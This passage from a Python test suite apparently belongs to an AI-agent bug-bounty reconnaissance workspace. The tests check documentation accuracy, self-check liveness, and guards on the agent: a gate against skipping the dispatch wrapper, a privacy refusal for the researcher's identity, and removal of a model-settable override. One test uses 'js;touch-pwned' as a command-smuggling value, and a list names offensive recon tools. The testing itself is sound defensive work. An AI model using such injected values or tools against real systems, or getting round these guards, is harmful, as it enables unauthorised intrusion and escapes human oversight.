    across six files" for a tier that is 4 files and ~47 KB. None of it was load-bearing on its
    own, but a file map that miscounts is a file map nobody can trust to be current.

    Each row pins a claim to a live measurement. If the regex stops matching — because someone
    rewrote the sentence — the test FAILS rather than silently passing on nothing, which is the
    same failure mode that let five safety rules go inert.
    """

    WORDS = {"thirty": 30, "thirty-one": 31, "thirty-two": 32, "twenty-five": 25,
             "twenty-six": 26, "twenty-seven": 27, "twenty-eight": 28, "twenty-nine": 29,
             "forty-five": 45, "forty-eight": 48}

    def _live(self):
        n_skills = len([p for p in (ROOT / "skills").glob("*.md")
                        if not p.name.startswith("_")])
        n_tools = len(list((ROOT / "tools").glob("*.py")) + list((ROOT / "tools").glob("*.sh")))
        n_flows = len([p for p in (ROOT / "playbooks" / "flows").glob("*.md")
                       if not p.name.startswith("_")])
        n_workflows = len([p for p in (ROOT / "playbooks" / "workflows").glob("*.md")
                           if not p.name.startswith("_")])
        cov = load_tool("coverage")
        n_classes = len(cov.load_signals()[0])
        return {"skills": n_skills, "tools": n_tools, "flows": n_flows, "classes": n_classes,
                "workflows": n_workflows}

    def _num(self, raw):
        raw = raw.strip().lower()
        return self.WORDS.get(raw, None) if not raw.isdigit() else int(raw)

    def test_documented_counts_match_reality(self):
        live = self._live()
        claims = [
            ("FILEMAP.md", r"\*\*([A-Za-z-]+) skills, one body each", "skills"),
            ("AGENTS.md", r"\*\*(\d+) vuln classes\*\*", "classes"),
            ("AGENTS.md", r"\*\*(\d+) flows\*\*", "flows"),
            ("README.md", r"\*\*(\d+) skills\*\*", "skills"),
            # the lean README's other counts — guarded so they cannot rot the way "20 tools" did.
            # \s+ not a literal space: prose wraps, so the number and noun may straddle a line.
            ("README.md", r"(\d+)\s+vulnerability classes", "classes"),
            ("README.md", r"(\d+)\s+analysis workflows", "workflows"),
        ]
        problems = []
        for fname, pattern, key in claims:
            text = (ROOT / fname).read_text(encoding="utf-8")
            m = re.search(pattern, text, re.M)
            if not m:
                problems.append(f"{fname}: the claim matching /{pattern}/ is gone — this check "
                                f"now verifies nothing; re-anchor it or drop the row")
                continue
            claimed = self._num(m.group(1))
            if claimed is None:
                problems.append(f"{fname}: cannot read '{m.group(1)}' as a number")
            elif claimed != live[key]:
                problems.append(f"{fname} says {m.group(1)} {key}, reality is {live[key]}")
        self.assertEqual([], problems, "\n  ".join([""] + problems))


class LiveCheckTests(unittest.TestCase):
    """A check that inspects nothing still reports PASS. That has happened twice.

    `check_semantics` was scoped to `playbooks/recon/`, deleted in the slug migration — five
    safety rules (unrestricted redirects, PUT/PATCH/DELETE sweeps, "click every button") went
    silently inert. `check_scope_wiring` globbed `skills/[0-9]*.md` and matched zero files once
    identity stopped being numeric. Both kept printing PASS for an entire migration.

    So: every content-scanning check must actually open a file. Existence-only checks are
    exempted BY NAME, so a new check cannot join that list by accident.
    """

    # Checks that legitimately read no file because they assert a path exists, not what is in it.
    EXISTENCE_ONLY = {"check_required"}

    @classmethod
    def setUpClass(cls):
        cls.sc = load_tool("self-check")
        src = (ROOT / "tools" / "self-check.py").read_text(encoding="utf-8")
        m = re.search(r"checks = \((.*?)\n    \)", src, re.S)
        assert m, "could not find the `checks = (...)` tuple in self-check.py"
        cls.names = [n.strip().rstrip(",") for n in m.group(1).splitlines() if n.strip().rstrip(",")]

    def test_the_check_roster_parsed(self):
        """If this regex ever stops matching, every assertion below silently passes on []."""
        self.assertGreater(len(self.names), 10, f"only parsed {self.names}")

    def test_every_check_is_callable(self):
        missing = [n for n in self.names if not callable(getattr(self.sc, n, None))]
        self.assertEqual([], missing, f"self-check registers names it does not define: {missing}")

    def test_every_content_check_actually_opens_a_file(self):
        from unittest import mock
        real = Path.read_text
        seen = {"n": 0}

        def counting(self_, *a, **k):
            seen["n"] += 1
            return real(self_, *a, **k)

        dead = []
        for name in self.names:
            if name in self.EXISTENCE_ONLY:
                continue
            fn = getattr(self.sc, name)
            seen["n"] = 0
            with mock.patch.object(Path, "read_text", counting):
                fn()
            if seen["n"] == 0:
                dead.append(name)
        self.assertEqual([], dead,
                         f"checks that inspect nothing and therefore always pass: {dead}")


class CatalogueCoverageTests(unittest.TestCase):
    """`class-signals.md` is the one file that says what this workspace can do — loaded whenever
    the task is to orient or recommend (it is no longer resident for an exactly named skill).

    Its stated job is to let the model suggest the class, skill or flow the hunter did not ask
    for — you cannot recommend what you do not know exists. So a skill missing from it is not a
    cosmetic gap: it is a capability the model can never propose. `derive-properties` — the
    bridge that turns endpoints into propertied rows, without which every vuln class looks
    inapplicable — was absent, while a real target sat on 6,546 live endpoints and zero attack
    surface rows. Nothing failed. That is exactly why it needs a test rather than a reader.
    """

    CATALOGUE = ROOT / "playbooks" / "system" / "class-signals.md"

    # Invoked by name, never reached by noticing a signal, so a signal->skill table has nothing
    # to say about them. Listed explicitly: a NEW skill must be catalogued or consciously named
    # here, and cannot slip through by being forgotten.
    DISPATCHERS = {"init-target", "run-flow", "vuln-hunt", "analyse-request", "ground-a-playbook", "compose-task"}

    @classmethod
    def setUpClass(cls):
        cls.text = cls.CATALOGUE.read_text(encoding="utf-8")
        cls.named = set(re.findall(r"`([a-z][a-z0-9-]+)`", cls.text))
        cls.skills = {p.stem for p in (ROOT / "skills").glob("*.md")
                      if not p.name.startswith("_")}
        cls.flows = {p.stem for p in (ROOT / "playbooks" / "flows").glob("*.md")
                     if not p.name.startswith("_")}

    def test_every_signal_routable_skill_is_catalogued(self):
        missing = sorted(self.skills - self.named - self.DISPATCHERS)
        self.assertEqual([], missing,
                         f"skills the model can never suggest, because the always-loaded "
                         f"catalogue does not mention them: {missing}")

    def test_every_flow_is_catalogued(self):
        missing = sorted(self.flows - self.named)
        self.assertEqual([], missing, f"flows absent from the catalogue: {missing}")

    def test_catalogue_routes_nothing_that_does_not_exist(self):
        """The other direction: a renamed skill leaves the catalogue pointing at a ghost.

        Deliberately narrow. Dangling *paths* are already caught by self-check's
        `check_no_dangling_file_references`, class names by `check_class_names` and property
        tokens by `check_property_vocabulary`. The one thing none of them sees is a bare
        backticked slug in a 'run this' column, because it looks like prose.
        """
        dangling = sorted(s for s in self._slugs_in_routing_tables()
                          if s not in self.skills | self.flows)
        self.assertEqual([], dangling, f"catalogue routes to things that do not exist: {dangling}")

    def _slugs_in_routing_tables(self):
        """The 'run this' column of the two tables whose right-hand side names a skill or flow.

        Scoped by section on purpose: the vuln-class and property tables also have a third
        column, but it holds property tokens and workflow names, which are checked elsewhere and
        are not skills. Reading every column found 28 false positives.
        """
        out = set()
        for section in ("Recon skills", "Flows — situation → bundle"):
            m = re.search(rf"^## {re.escape(section)}\b(.*?)(?=^## |\Z)",
                          self.text, re.M | re.S)
            self.assertIsNotNone(m, f"section '{section}' vanished from the catalogue — this "
                                    f"test silently checks nothing without it")
            for line in m.group(1).splitlines():
                cells = [c.strip() for c in line.split("|")]
                if len(cells) > 2:
                    out |= set(re.findall(r"`([a-z][a-z0-9-]+)`", cells[2]))
        return out

    def test_the_recon_to_hunting_bridge_is_reachable(self):
        """Guards the specific hole, by name, in the table that would fix it."""
        self.assertIn("derive-properties", self._slugs_in_routing_tables(),
                      "derive-properties is not in any routing table — recon can complete and "
                      "hunting still have nothing to select a class on")


class RefutationStepTests(unittest.TestCase):
    """The hunting loop must actively try to KILL a finding before it is reported — a pass whose
    only job is to disprove it, where only a concrete refutation counts, not a hunch. This catches
    the plausible-but-wrong finding a confirmation pass never will. Guarded so it cannot be quietly
    dropped or softened into 'optional'."""

    MASTER = ROOT / "playbooks" / "vulns" / "_master-vuln-hunting.md"

    @classmethod
    def setUpClass(cls):
        cls.text = cls.MASTER.read_text(encoding="utf-8")

    def test_a_refutation_step_exists(self):
        self.assertRegex(self.text, r"(?im)^###\s*7b\.\s*Refute",
                         "the 'refute before you trust it' step is gone from the hunting loop")

    def test_it_demands_a_concrete_refutation_not_a_hunch(self):
        # the load-bearing rule: a vague doubt does not weaken a finding; only a specific blocker
        # kills it. If this phrasing is removed, the step has been softened into a formality.
        seg = re.search(r"### 7b\..*?(?=^### 8\.)", self.text, re.S | re.M)
        self.assertIsNotNone(seg, "could not isolate the 7b section")
        body = seg.group(0).lower()
        self.assertIn("concrete refutation", body,
                      "the step must require a CONCRETE refutation, not a hunch")
        for angle in ("reachability", "trigger", "impact"):
            self.assertIn(angle, body, f"the refutation step must cover {angle}")

    def test_it_stays_within_minimal_footprint(self):
        """Refuting must not become a licence to escalate — it is done by reasoning over evidence
        already held, not by sending more."""
        seg = re.search(r"### 7b\..*?(?=^### 8\.)", self.text, re.S | re.M).group(0).lower()
        self.assertTrue("re-read" in seg or "reasoning" in seg,
                        "refutation must be by re-reading/reasoning, not by escalating traffic")

    def test_it_precedes_the_record_step(self):
        i7b = self.text.index("### 7b.")
        i_record = self.text.index("### 9. Record")
        self.assertLess(i7b, i_record, "refutation must come before recording/reporting")


class VpsRunWrapperTests(unittest.TestCase):
    """The local pre-dispatch layer: it moves the privacy check to where config lives (local), so
    it actually fires — run.py's own check is inert on the VPS — and injects the attribution header
    so the model never types or misplaces it."""

    @classmethod
    def setUpClass(cls):
        cls.w = load_tool("vps-run")

    def test_attribution_injected_for_a_known_http_tool(self):
        argv, injected = self.w.inject_attribution(["curl", "https://t/"], "X-Bug-Bounty", "h")
        self.assertTrue(injected)
        self.assertIn("-H", argv)
        self.assertIn("X-Bug-Bounty: h", argv)

    def test_verified_specialized_tool_header_adapter_is_used(self):
        argv, injected = self.w.inject_attribution(
            ["gowitness", "scan", "single", "https://t/"], "X-Bug-Bounty", "h")
        self.assertTrue(injected)
        self.assertEqual(["--chrome-header", "X-Bug-Bounty: h"], argv[-2:])

    def test_verified_whatweb_header_adapter_is_used(self):
        argv, injected = self.w.inject_attribution(
            ["whatweb", "https://t/"], "X-Bug-Bounty", "h")
        self.assertTrue(injected)
        self.assertEqual(["-H", "X-Bug-Bounty: h"], argv[-2:])

    def test_not_injected_for_a_non_http_tool(self):
        argv, injected = self.w.inject_attribution(["dnsx", "-l", "x.txt"], "X-Bug-Bounty", "h")
        self.assertFalse(injected, "dnsx takes no HTTP header — injecting -H would corrupt it")
        self.assertEqual(["dnsx", "-l", "x.txt"], argv)

    def test_not_double_injected_when_already_present(self):
        argv, injected = self.w.inject_attribution(
            ["httpx", "-H", "X-Bug-Bounty: mine", "-l", "h"], "X-Bug-Bounty", "mine")
        self.assertFalse(injected)
        self.assertEqual(1, sum(1 for a in argv if a.startswith("X-Bug-Bounty:")))

    def test_remote_command_leaves_tilde_paths_unquoted_but_quotes_tokens(self):
        """The tilde-expansion trap: single-quoting `~/…` makes the tilde literal and run.py is
        never found. The scaffold paths stay bare; the -H value (has a space) is quoted."""
        args = type("A", (), {"target": "targets/acme", "skill": "http-probing",
                              "run_id": None, "expect_file": "raw/o.json", "timeout": None})()
        flat = {"vps.codedir": "~/hunterstick", "vps.workdir": "~/targets"}
        cmd = self.w.build_remote_command(flat, args, ["curl", "https://t/", "-H", "X: a b"])
        self.assertIn("~/hunterstick/tools/run.py", cmd)
        self.assertNotIn("'~/hunterstick", cmd, "a single-quoted tilde would not expand remotely")
        self.assertIn("~/targets/acme", cmd)
        self.assertIn("'X: a b'", cmd, "a token with a space must be quoted")

    def test_output_contract_options_are_forwarded_to_remote_runner(self):
        args = type("A", (), {"target": "targets/acme", "skill": "javascript-analysis",
                              "run_id": None, "expect_file": None,
                              "stdout_file": "raw/js/urls.jsonl", "expect_format": "jsonl",
                              "expect_fields": "url,method", "timeout": None})()
        cmd = self.w.build_remote_command({"vps.codedir": "~/hs", "vps.workdir": "~/t"},
                                          args, ["jsluice", "urls", "bundle.js"])
        self.assertIn("--stdout-file raw/js/urls.jsonl", cmd)
        self.assertIn("--expect-format jsonl", cmd)
        self.assertIn("--expect-fields url,method", cmd)

    def test_detached_command_keeps_the_runner_inside_tmux(self):
        remote = "HUNTERSTICK_VPSRUN=1 python3 ~/hs/tools/run.py ~/t/acme -- jsluice urls app.js"
        command = self.w.detached_remote_command("js-analysis", remote)
        self.assertTrue(command.startswith("tmux new-session -d -s js-analysis "))
        self.assertIn("tools/run.py", command)
        self.assertIn("jsluice urls app.js", command)

    def test_detached_session_name_cannot_be_shell_syntax(self):
        with self.assertRaises(SystemExit) as stopped:
            self.w.detached_remote_command("js;touch-pwned", "true")
        self.assertEqual(2, stopped.exception.code)

    def test_print_only_needs_no_network(self):
        import subprocess
        r = subprocess.run([sys.executable, str(ROOT / "tools" / "vps-run.py"),
                            "targets/acme", "--skill", "http-probing", "--print",
                            "--", "curl", "https://t/"], capture_output=True, text=True)
        self.assertEqual(0, r.returncode, r.stderr)
        self.assertIn("tools/run.py", r.stdout)
        self.assertIn("curl", r.stdout)

    def _run_main_no_network(self, argv_tail, private, attr_vals):
        """Drive main() in-process with a fake config + a subprocess.run that FAILS if reached, so a
        test can prove a refusal happened BEFORE any SSH. Returns (exit_code, ssh_called)."""
        from unittest import mock
        w = self.w
        state = {"ssh": False}

        def no_ssh(*a, **k):
            state["ssh"] = True
            class R:
                returncode, stdout, stderr = 0, "", ""
            return R()

        argv = ["vps-run.py", "targets/acme", "--skill", "http-probing", "--"] + argv_tail
        with mock.patch.object(w._run, "private_values", lambda: private), \
             mock.patch.object(w._run, "attribution_values", lambda: attr_vals), \
             mock.patch.object(w._run, "attribution_header", lambda: ("X-Bug-Bounty", "hv")), \
             mock.patch.object(w, "_cfg", lambda: (None, {"vps.enabled": True,
                                                          "vps.codedir": "~/hs", "vps.workdir": "~/t"})), \
             mock.patch.object(w.subprocess, "run", no_ssh), \
             mock.patch.object(sys, "argv", argv):
            import io, contextlib
            try:
                with contextlib.redirect_stderr(io.StringIO()):
                    rc = w.main()
            except SystemExit as e:
                rc = e.code
        return rc, state["ssh"]

    def test_private_identity_is_refused_before_ssh(self):
        rc, ssh = self._run_main_no_network(
            ["curl", "https://t/?c=secret@me.example"],
            private=[("researcher.contact_email", "secret@me.example")], attr_vals=[])
        self.assertEqual(2, rc, "a private value in the command must exit 2")
        self.assertFalse(ssh, "SSH must NOT be called once the command is refused")

    def test_known_bad_jsluice_invocation_is_refused_before_ssh(self):
        rc, ssh = self._run_main_no_network(
            ["jsluice", "urls", "-R", "bundle.js", "bundle.js"],
            private=[], attr_vals=[])
        self.assertEqual(2, rc)
        self.assertFalse(ssh, "known-bad command must not be dispatched")

    def test_misplaced_attribution_is_refused_before_ssh(self):
        rc, ssh = self._run_main_no_network(
            ["curl", "https://t/?u=jhunter"], private=[], attr_vals=["jhunter"])
        self.assertEqual(2, rc, "the handle in a URL must exit 2")
        self.assertFalse(ssh, "SSH must NOT be called once the command is refused")

    def test_the_http_tool_registry_lives_once(self):
        """Neither the verified inject map nor the wider egress set is copied into the wrapper."""
        self.assertIs(self.w.HTTP_INJECT, self.w._run.ATTRIBUTION_TOOLS)
        self.assertIs(self.w.TARGET_HTTP_TOOLS, self.w._run.TARGET_HTTP_TOOLS)

    def test_dispatch_sets_the_gate_marker(self):
        """The VPS-side run.py refuses an ungated HTTP tool; only this path may set the marker."""
        run = load_tool("run")
        args = type("A", (), {"target": "targets/acme", "skill": "http-probing",
                              "run_id": None, "expect_file": None, "timeout": None})()
        cmd = self.w.build_remote_command({"vps.codedir": "~/hs", "vps.workdir": "~/t"},
                                          args, ["curl", "https://t/"])
        self.assertTrue(cmd.startswith(f"{run.GATE_ENV}=1 python3 "),
                        f"the dispatched command must carry the gate marker: {cmd}")


class BypassGateTests(unittest.TestCase):
    """run.py on the VPS has no config, so its identity check is inert there. The gate stops a
    command from SKIPPING vps-run.py (the local check): an HTTP tool with no gate marker is refused,
    steering it back through the wrapper. A steer against accidental bypass, not a boundary against
    a model that deliberately sets the marker."""

    @classmethod
    def setUpClass(cls):
        cls.rp = load_tool("run")

    def test_ungated_http_tool_is_blocked(self):
        self.assertTrue(self.rp.http_gate_blocks(["curl", "https://t/"], {}))
        self.assertTrue(self.rp.http_gate_blocks(["/usr/bin/httpx", "-l", "h"], {}),
                        "a path-prefixed tool name must still be recognised by basename")

    def test_documented_specialized_http_tools_cannot_bypass_the_wrapper(self):
        for tool in ("arjun", "x8", "whatweb", "wafw00f", "gowitness", "grpcurl",
                     "clairvoyance", "graphw00f", "git-dumper", "sourcemapper", "subzy",
                     "waymore", "bbot"):
            self.assertTrue(self.rp.http_gate_blocks([tool, "https://t/"], {}), tool)

    def test_gated_http_tool_is_allowed(self):
        self.assertFalse(self.rp.http_gate_blocks(["curl", "https://t/"],
                                                   {self.rp.GATE_ENV: "1"}))

    def test_non_http_tool_is_never_gated(self):
        for tool in ("dnsx", "naabu", "subfinder", "sh"):
            self.assertFalse(self.rp.http_gate_blocks([tool, "-x"], {}),
                             f"{tool} does not send HTTP to a target — must run ungated")

    def test_remote_runner_adds_user_tool_directories_without_dropping_path(self):
        from unittest import mock
        with mock.patch.dict(os.environ, {"PATH": "/usr/bin:/bin"}, clear=False):
            path = self.rp.execution_env()["PATH"].split(os.pathsep)
        self.assertIn(str(Path.home() / ".local" / "bin"), path)
        self.assertIn(str(Path.home() / "go" / "bin"), path)
        self.assertIn("/usr/bin", path)

    def test_cli_refuses_ungated_http_and_names_the_wrapper(self):
        import subprocess, tempfile
        with tempfile.TemporaryDirectory() as tmp:
            t = Path(tmp); (t / "index.md").write_text("# t\n")
            # curl is never executed — the gate refuses before running, so curl need not exist.
            r = subprocess.run([sys.executable, str(ROOT / "tools" / "run.py"), str(t),
                                "--skill", "http-probing", "--", "curl", "https://t/"],
                               capture_output=True, text=True,
                               env={k: v for k, v in os.environ.items()
                                    if k != self.rp.GATE_ENV})
            self.assertEqual(2, r.returncode, r.stdout + r.stderr)
            self.assertIn("vps-run.py", r.stdout + r.stderr)


class PrivacyBoundaryTests(unittest.TestCase):
    """Researcher/private context is never payload material. This is the boundary a real incident
    would cross: a form asks for first+last name, the model derives them from the operator's email,
    and now the researcher's identity is in an outbound request AND copied into the execution
    record. Two defences, both tested here: the always-loaded RULE (model-side) and run.py's
    mechanical backstop (catches the mistake, exact-match so no false positives on target data)."""

    ALWAYS_LOADED = ("AGENTS.md", "playbooks/system/orchestrator.md")

    def test_the_boundary_rule_is_in_every_always_loaded_contract(self):
        """A rule that lives in one file the model may not have loaded is a rule that gets missed.
        It must be resident wherever the contract is stated."""
        for rel in self.ALWAYS_LOADED:
            t = (ROOT / rel).read_text(encoding="utf-8").lower()
            self.assertIn("never application payload", t,
                          f"{rel} must state that the researcher's identity is never application payload")
            self.assertTrue("synthetic" in t and ("target principal" in t or "target account" in t
                                                   or "target user" in t),
                            f"{rel} must name the value kinds so the model can tell them apart")
            # the placement classification the second review required
            self.assertIn("attribution header", t,
                          f"{rel} must say public attribution belongs only in its designated header")

    # private = [(category, value)]; the public attribution handle is deliberately NOT in this set.
    PRIV = [("researcher.contact_email", "me@researcher.example"),
            ("researcher.protected_aliases[0]", "Jane Q Hunter")]

    def test_private_identity_in_payload_is_caught_by_category_never_value(self):
        run = load_tool("run")
        argv = ["curl", "https://t.example.com/?contact=me@researcher.example"]
        cats = run.identity_in_argv(argv, self.PRIV)
        self.assertEqual(["researcher.contact_email"], cats,
                         "the private email must be caught — reported as a CATEGORY")
        self.assertTrue(all("@" not in c for c in cats), "identity_in_argv must not return values")

    def test_attribution_placement_is_decided_by_structure_not_text_shape(self):
        """The third review's bypass: the checker allowed anything whose TEXT started with the
        header name, so `-d 'X-Bug-Bounty: h'` (a body) and `-b '…'` (a cookie) passed. Placement
        must be decided by argument STRUCTURE — the previous arg is a header flag, or it is the
        `--header=` combined form. And BOTH the header value AND the handle are protected."""
        run = load_tool("run")
        name = "X-Bug-Bounty"
        vals = ["Intigriti-jhunter", "jhunter"]        # header_value AND handle, different values
        allowed = [
            ["curl", "-H", "X-Bug-Bounty: Intigriti-jhunter", "https://t/"],
            ["curl", "--header=X-Bug-Bounty: Intigriti-jhunter", "https://t/"],
            ["wget", "--header", "X-Bug-Bounty: jhunter", "https://t/"],
        ]
        refused = [
            ["curl", "-d", "X-Bug-Bounty: Intigriti-jhunter", "https://t/"],   # body
            ["curl", "-b", "X-Bug-Bounty: jhunter", "https://t/"],             # cookie
            ["curl", "https://t/?u=jhunter"],                                  # handle in URL
            ["curl", "-H", "Cookie: u=jhunter", "https://t/"],                 # different header
            ["tool", "X-Bug-Bounty: jhunter"],                                 # bare positional
        ]
        for argv in allowed:
            self.assertFalse(run.attribution_misplaced(argv, name, vals), f"should allow: {argv}")
        for argv in refused:
            self.assertTrue(run.attribution_misplaced(argv, name, vals), f"should refuse: {argv}")

    def test_a_targets_data_is_never_flagged(self):
        run = load_tool("run")
        argv = ["curl", "https://t.example.com/?email=victim@target.com&name=Victim"]
        self.assertEqual([], run.identity_in_argv(argv, self.PRIV))

    def test_response_leak_is_reported_by_category_and_stores_no_value(self):
        run = load_tool("run")
        leaks, _ = run.scan_private("welcome me@researcher.example", self.PRIV, "artifact")
        self.assertTrue(leaks, "a private value echoed in the response is a real leak")
        self.assertTrue(all("me@researcher.example" not in l for l in leaks),
                        "the leak message must name the CATEGORY, never the raw value")
        self.assertTrue(any("researcher.contact_email" in l for l in leaks))
        _, notes = run.scan_private("owner is admin@target.com", self.PRIV, "artifact")
        self.assertTrue(notes, "a non-researcher email is a note, not a condemnation")

    def test_there_is_no_model_settable_override(self):
        """--allow-identity was model-controlled, so it was not human authorisation. It is gone;
        the refusal is unconditional."""
        run = load_tool("run")
        src = (ROOT / "tools" / "run.py").read_text(encoding="utf-8")
        self.assertNotIn("--allow-identity", src, "the model-settable override must be removed")
        self.assertNotIn("allow_identity", src)

    def test_the_docstring_is_honest_about_the_local_only_limit(self):
        """The mechanical net reads config, which is not on the VPS. The docs must SAY it is
        local-only defense-in-depth and that exposure-minimisation is the real control — not
        claim it mechanically catches the incident everywhere."""
        run = load_tool("run")
        doc = (run.__doc__ or "") + (run.private_values.__doc__ or "")
        low = doc.lower()
        self.assertIn("exposure minimisation", low.replace("exposure-minimisation", "exposure minimisation"),
                      "must name exposure-minimisation as the primary control")
        self.assertTrue("not on the vps" in low or "config, which is" in low,
                        "must admit the net does not fire where config (the VPS) is absent")

    def _patched_config(self, exists, load_fn):
        """Install a fake `config` module for run.py's in-function `import config`."""
        import importlib.util
        spec = importlib.util.spec_from_file_location("config", ROOT / "tools" / "config.py")
        cfg = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(cfg)

        class FakePath:
            def __init__(self, e): self._e = e
            def exists(self): return self._e
        cfg.CONFIG = FakePath(exists)
        cfg.EXAMPLE = FakePath(exists)
        cfg.load = load_fn
        return cfg

    def test_absent_config_returns_empty_and_does_not_raise(self):
        """On the VPS only tools/ is deployed — config files are absent. private_values() runs on
        EVERY command, so it must return [] quietly (the net is simply inactive), never crash."""
        from unittest import mock
        run = load_tool("run")
        cfg = self._patched_config(exists=False,
                                   load_fn=lambda: (_ for _ in ()).throw(SystemExit(2)))
        with mock.patch.dict(sys.modules, {"config": cfg}):
            self.assertEqual([], run.private_values())

    def test_present_but_broken_config_fails_loud_not_open(self):
        """The reviewer's point: catching BaseException blindly is fail-OPEN — a malformed local
        config would silently disable the guard. If config files EXIST but load() fails, that must
        propagate loudly, not become an empty (unprotected) result."""
        from unittest import mock
        run = load_tool("run")
        cfg = self._patched_config(exists=True,
                                   load_fn=lambda: (_ for _ in ()).throw(SystemExit(2)))
        with mock.patch.dict(sys.modules, {"config": cfg}):
            with self.assertRaises(SystemExit):
                run.private_values()

    def test_private_values_never_leak_out_via_env(self):
        cfg = load_tool("config")
        flat = {"researcher.contact_email": "me@r.example", "researcher.handle": "pub",
                "vps.host": "1.2.3.4"}
        import io, contextlib
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            cfg.cmd_env(flat, None)
        out = buf.getvalue()
        self.assertNotIn("me@r.example", out, "env must never export the private email")
        self.assertIn("1.2.3.4", out, "non-private config still exports")

    def test_get_refuses_a_private_path(self):
        import subprocess
        r = subprocess.run([sys.executable, str(ROOT / "tools" / "config.py"),
                            "get", "researcher.contact_email"], capture_output=True, text=True)
        self.assertEqual(2, r.returncode)
        self.assertIn("PRIVATE", r.stdout + r.stderr)

    def test_config_hides_identity_but_keeps_the_header_name(self):
        """Now that vps-run.py injects the header, the model never needs the raw value — so
        handle AND header_value are hidden too (check/get/env). The header NAME stays visible: it is
        not identifying, and the model needs it to recognise the header."""
        cfg = load_tool("config")
        for hidden in ("researcher.contact_email", "researcher.protected_aliases",
                       "researcher.handle", "researcher.header_value"):
            self.assertTrue(cfg.PRIVATE_RE.search(hidden), f"{hidden} must be hidden")
        self.assertFalse(cfg.PRIVATE_RE.search("researcher.header_name"),
                         "the header NAME is not identity — the model needs it")

    def test_cli_refuses_private_identity_before_sending(self):
        """End-to-end and hermetic: patch private_values, and a command carrying the private email
        exits 2 before executing, naming the category, not the value."""
        import subprocess, tempfile
        with tempfile.TemporaryDirectory() as tmp:
            t = Path(tmp); (t / "index.md").write_text("# t\n")
            wrapper = t / "w.py"
            wrapper.write_text(
                "import importlib.util,sys\n"
                f"s=importlib.util.spec_from_file_location('run',{str(ROOT / 'tools' / 'run.py')!r})\n"
                "m=importlib.util.module_from_spec(s);s.loader.exec_module(m)\n"
                "m.private_values=lambda: [('researcher.contact_email','secret@me.example')]\n"
                "sys.exit(m.main())\n", encoding="utf-8")
            base = [sys.executable, str(wrapper), str(t), "--skill", "http-probing", "--"]
            leak = base + ["curl", "https://x.example/?e=secret@me.example"]
            r = subprocess.run(leak, capture_output=True, text=True)
            self.assertEqual(2, r.returncode, r.stdout + r.stderr)
            out = r.stdout + r.stderr
            self.assertIn("researcher.contact_email", out, "must name the category")
            self.assertNotIn("secret@me.example", out, "must NOT print the raw value")
            # a clean command with only the public handle runs fine
            ok = base + ["sh", "-c", "echo hi"]
            r2 = subprocess.run(ok, capture_output=True, text=True)
            self.assertIn(r2.returncode, (0, 1), r2.stdout + r2.stderr)


class EndToEndLifecycleTests(unittest.TestCase):
    """One test that walks the whole contract the way a session does:

        select skill -> verify inputs -> open run -> execute & record evidence
        -> persist the delta -> close run -> resume on a fresh model.

    Each step is driven through the REAL tool, not a reimplementation. The VPS is simulated by
    running `run.py` against a local command — legitimate, because run.py is now a pure recorder
    with no execution-host gate, so the evidence path it exercises is identical. This is the
    integration coverage the migration lacked: every unit test proved a part, none proved the
    parts compose.
    """

    def _tool(self, *args, **kw):
        import subprocess
        return subprocess.run([sys.executable, str(ROOT / "tools" / args[0])] + list(args[1:]),
                              capture_output=True, text=True, **kw)

    def test_the_whole_loop_composes(self):
        import subprocess, tempfile, shutil, json, io, contextlib
        with tempfile.TemporaryDirectory() as tmp:
            t = Path(tmp) / "acme"
            shutil.copytree(ROOT / "targets" / "_template", t)
            (t / "index.md").write_text("# acme\n", encoding="utf-8")
            (t / "scope.md").write_text("### In scope\n- `*.acme.com`\n", encoding="utf-8")
            (t / "recon").mkdir(exist_ok=True)

            # 1. SELECT + VERIFY INPUTS — supply the required input, then preflight passes honestly
            self._tool("record.py", str(t), "--into", "recon/resolved.txt",
                       "--source", "hunter, prompt", "--", "www.acme.com")
            (t / "recon" / "live-hosts.txt").write_text("https://www.acme.com\n", encoding="utf-8")
            pf = self._tool("preflight.py", str(t), "http-probing")
            self.assertEqual(0, pf.returncode, f"inputs present, should be ready:\n{pf.stdout}")

            # 2. OPEN RUN — before any traffic, so an interrupted session leaves a trace
            openr = self._tool("kb.py", "run", str(t), "--skill", "http-probing",
                               "--selector", "live hosts", "--status", "running")
            self.assertEqual(0, openr.returncode, openr.stderr)
            self.assertIn("R-001", openr.stdout)

            # 3. EXECUTE + RECORD EVIDENCE — run.py records; success judged on the ARTIFACT
            art = "raw/probe.json"
            (t / "raw").mkdir(exist_ok=True)
            run = self._tool("run.py", str(t), "--skill", "http-probing", "--run-id", "R-001",
                             "--expect-file", art, "--",
                             "sh", "-c", f"printf '{{\"host\":\"www.acme.com\"}}' > {art}")
            self.assertEqual(0, run.returncode, f"recorder should succeed:\n{run.stdout}\n{run.stderr}")
            execdir = t / "logs" / "exec"
            records = list(execdir.glob("*.json"))
            self.assertTrue(records, "run.py must leave an evidence record in logs/exec/")
            rec = json.loads(records[0].read_text())
            self.assertEqual("http-probing", rec["skill"])
            self.assertTrue(rec["artifact"]["exists"] and rec["artifact"]["bytes"] > 0,
                            "evidence must record the artifact it was judged on")

            # 4. PERSIST THE DELTA — a fact, with evidence, enters the durable brain
            add = self._tool("kb.py", "add", str(t), "--subject", "www.acme.com",
                             "--predicate", "runs", "--object", "nginx",
                             "--confidence", "observed", "--source", "http-probing",
                             "--evidence", art)
            self.assertEqual(0, add.returncode, add.stderr)

            # 5. CLOSE RUN — however it ended, with what it did NOT cover
            fin = self._tool("kb.py", "run", str(t), "--finish", "R-001",
                             "--status", "complete-for-this-run", "--result", "1 host probed",
                             "--limitations", "one host only")
            self.assertEqual(0, fin.returncode, fin.stderr)
            self.assertIn("R-001", (t / "runs.tsv").read_text())

            # 6. RESUME ON A FRESH MODEL — reconstructed from files, routed to the CURRENT slug
            brief = load_tool("brief")
            orig = brief.TARGETS
            original_monitor = brief.monitor_resume_state
            brief.TARGETS = Path(tmp)
            brief.monitor_resume_state = lambda _target: None
            try:
                buf = io.StringIO()
                with contextlib.redirect_stdout(buf):
                    rc = brief.resume("acme")
                out = buf.getvalue()
            finally:
                brief.TARGETS = orig
                brief.monitor_resume_state = original_monitor
            self.assertEqual(0, rc)
            self.assertIn("http-probing", out, "resume must surface the run's skill")
            self.assertNotRegex(out, r"\b\d\d-[a-z-]+ playbook",
                                "resume must not name a deleted numbered playbook")


class ControlContractTests(unittest.TestCase):
    """Behavioural consistency, not just structural integrity.

    A green suite gave too much confidence during the migration: it proved files existed and
    parsed, while several always-loaded files still told the model the opposite of the new
